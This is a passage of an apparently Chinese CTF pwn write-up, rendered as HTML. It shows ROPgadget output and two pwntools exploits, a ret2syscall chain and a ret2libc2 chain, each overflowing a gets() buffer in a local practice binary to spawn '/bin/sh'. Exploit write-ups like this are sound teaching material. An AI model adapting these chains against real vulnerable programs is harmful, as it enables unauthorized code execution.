+</span></span><span style="display:flex;"><span>guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop  --only <span style="color:#e6db74">&#34;pop|ret&#34;</span> | grep <span style="color:#e6db74">&#39;edx&#39;</span>
+</span></span><span style="display:flex;"><span>0x0806eb69 : pop ebx ; pop edx ; ret
+</span></span><span style="display:flex;"><span>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+</span></span><span style="display:flex;"><span>0x0806eb6a : pop edx ; ret
+</span></span><span style="display:flex;"><span>0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
+</span></span><span style="display:flex;"><span>guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop  --string <span style="color:#e6db74">&#39;/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>Strings information
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
+</span></span><span style="display:flex;"><span>0x080be408 : /bin/sh
+</span></span><span style="display:flex;"><span>guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop  --only <span style="color:#e6db74">&#39;int&#39;</span>
+</span></span><span style="display:flex;"><span>Gadgets information
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
+</span></span><span style="display:flex;"><span>0x08049421 : int 0x80
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$  
+</span></span></code></pre></div><h3 id="构造exp">构造exp<a hidden class="anchor" aria-hidden="true" href="#构造exp">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./rop&#39;</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_eax_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080bb196</span>
+</span></span><span style="display:flex;"><span>pop_edx_ecx_ebx_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0806eb90</span>
+</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080be408</span> 
+</span></span><span style="display:flex;"><span>int_0x80 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049421</span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>, pop_eax_ret, <span style="color:#ae81ff">0xb</span>, pop_edx_ecx_ebx_ret, <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,sh,int_0x80]
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(p)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive() 
+</span></span></code></pre></div><h2 id="ret2libc2">ret2libc2<a hidden class="anchor" aria-hidden="true" href="#ret2libc2">#</a></h2>
+<h3 id="1源码分析">1.源码分析<a hidden class="anchor" aria-hidden="true" href="#1源码分析">#</a></h3>
+<p>存在system函数但是不存在/bin/sh字符串所以需要自己往里写, 往程序里写东西可用通过再次触发gets函数往指定的地址写东西，然后触发system函数。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>int __cdecl main(int argc, const char **argv, const char **envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  char v4; // [esp-68h] [ebp-68h] BYREF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, 0, 2, 0);
+</span></span><span style="display:flex;"><span>  setvbuf(_bss_start, 0, 1, 0);
+</span></span><span style="display:flex;"><span>  puts(&#34;Something surprise here, but I don&#39;t think it will work.&#34;);
+</span></span><span style="display:flex;"><span>  printf(&#34;What do you think ?&#34;);
+</span></span><span style="display:flex;"><span>  gets(&amp;v4);
+</span></span><span style="display:flex;"><span>  return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="2构建exp">2.构建Exp<a hidden class="anchor" aria-hidden="true" href="#2构建exp">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2libc2&#39;</span>)
+</span></span><span style="display:flex;"><span>system_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8048490</span>
+</span></span><span style="display:flex;"><span>gets_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8048460</span>
+</span></span><span style="display:flex;"><span>pop_ebx_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804843d</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804AF00</span> <span style="color:#75715e">#看程序权限vmmap哪可以往里写就写哪</span>
+</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>, <span style="color:#75715e"># 溢出填充</span>
+</span></span><span style="display:flex;"><span>  gets_plt, <span style="color:#75715e"># 接收sh</span>
+</span></span><span style="display:flex;"><span>  pop_ebx_ret, 
+</span></span><span style="display:flex;"><span>  buf, <span style="color:#75715e"># 接收的参数弹到ebx寄存中</span>
+</span></span><span style="display:flex;"><span>  system_plt, <span style="color:#75715e">#调用systemcall</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>, <span style="color:#75715e">#垃圾数据填充systemcall第一个参数</span>
+</span></span><span style="display:flex;"><span>  buf<span style="color:#75715e">#作为地址提交</span>
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(p)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(sh)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div>
